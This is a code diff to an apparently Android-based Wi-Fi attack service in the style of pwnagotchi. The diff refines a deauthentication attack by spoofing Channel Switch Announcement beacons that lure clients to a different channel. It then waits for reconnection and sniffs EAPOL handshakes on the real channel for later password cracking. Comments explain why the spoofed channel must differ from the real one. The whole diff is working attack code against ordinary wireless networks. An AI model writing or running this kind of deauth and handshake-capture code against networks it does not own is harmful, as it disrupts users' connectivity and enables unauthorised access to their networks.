@@ -333,7 +333,7 @@ public class PwngService extends Service {
         if (noClientsBlacklist.contains(bssid)) {
             brain.currentStatus = "🫗 no clients (blacklisted) " + ssid;
             currentPhase = "SKIP";
-            lastSniffResult = "blacklisted";
+            lastSniffResult = "no_clients";  // was "blacklisted" — brain needs to count this too
             android.util.Log.i("PwngService", "Skipping " + ssid + " — no clients (blacklisted)");
             return false;
         }
@@ -354,26 +354,48 @@ public class PwngService extends Service {
         
         lastSniffResult = null;  // reset — clients found, proceeding
         
-        // Phase 1: CSA deauth burst (20s, ~100 calls, ~1000 deauth + ~1000 CSA beacons)
-        // (was 10s — too short, client often didn't disconnect)
-        brain.currentStatus = "👊 CSA flood " + ssid + " ch" + channel;
+        // Calculate CSA lure channel — DIFFERENT from AP's channel
+        // Client ignores "switch to same channel" — must be a real channel change
+        // 2.4 GHz rotation: 1→6→11→1
+        int[] CSA_CHANNELS_24 = {1, 6, 11};
+        int csaChannel = channel; // fallback
+        int csaFreqMhz = freqMhz; // fallback
+        if (channel >= 1 && channel <= 14) {
+            for (int ch : CSA_CHANNELS_24) {
+                if (ch != channel) {
+                    csaChannel = ch;
+                    // freq = 2407 + channel * 5
+                    csaFreqMhz = 2407 + ch * 5;
+                    break;
+                }
+            }
+        }
+        
+        // Phase 1: CSA deauth burst — deauth on AP channel, CSA lures to DIFFERENT channel
+        // (was: same channel → client ignored it. now: "AP is moving to ch6!")
+        brain.currentStatus = "👊 CSA " + ssid + " ch" + channel + "→" + csaChannel;
         currentPhase = "DEAUTH";
+        android.util.Log.i("PwngService", "CSA burst: " + ssid + " deauth@" + freqMhz 
+            + "MHz CSA-lure→" + csaFreqMhz + "MHz (ch" + csaChannel + ")");
         updateNotification();
         
-        monitor.deauthBurst(bssid, freqMhz, 20);
+        monitor.deauthBurst(bssid, freqMhz, csaFreqMhz, 20);
         
         if (!isRunning) return false;
         
-        // Phase 2: Wait for client to reconnect (5s)
-        brain.currentStatus = "⏳ waiting reconnect " + ssid;
+        // Phase 2: Stay on original channel — client may briefly disconnect from CSA confusion
+        // but will reconnect on the AP's REAL channel. We stay to capture.
+        brain.currentStatus = "⏳ waiting reconnect " + ssid + " (ch" + channel + ")";
         currentPhase = "WAIT";
+        // Don't switch channel! CSA lure was fake — real AP is still on original channel
+        sleep(2000);
         updateNotification();
-        sleep(5000);
+        sleep(3000);
         
         if (!isRunning) return false;
         
-        // Phase 3: Passive EAPOL capture (60s, wlan addr3 filter)
-        brain.currentStatus = "👂 sniffing EAPOL " + ssid;
+        // Phase 3: Passive EAPOL capture on original channel (60s, wlan addr3 filter)
+        brain.currentStatus = "👂 sniffing ch" + channel + " " + ssid;
         currentPhase = "SNIFF";
         updateNotification();
         
